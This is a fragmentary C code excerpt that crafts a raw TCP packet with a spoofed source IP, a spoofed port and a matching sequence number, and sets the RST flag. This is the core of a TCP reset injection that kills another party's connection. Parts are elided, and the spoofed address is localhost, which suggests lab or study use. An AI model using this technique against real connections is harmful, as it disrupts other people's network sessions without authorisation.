...
#define SPOOF_PORT 43892
#define SPOOF_SEQ 1981259987
// spoofed port is client's port
#define SPOOF_IPADDR "127.0.0.1" // spoofed IP address is client's IP address
...
int main (void) {
    ...
    iph->saddr = inet_addr ( source_ip );	// Source address spoofed to client's IP address
    iph->daddr = dest_addr.sin_addr.s_addr;

    //TCP Header
    tcph->source = htons(SPOOF_PORT);
    tcph->dest = htons(DEST_PORT);
    tcph->seq = htonl(SPOOF_SEQ); // SEQ must = SEQ sent from client in ACK packet
    tcph->ack_seq = 0;
    tcph->doff = 5; // Offset to length of TCP header (without flags it is 5)
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=1; // Set TCP RST flag
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
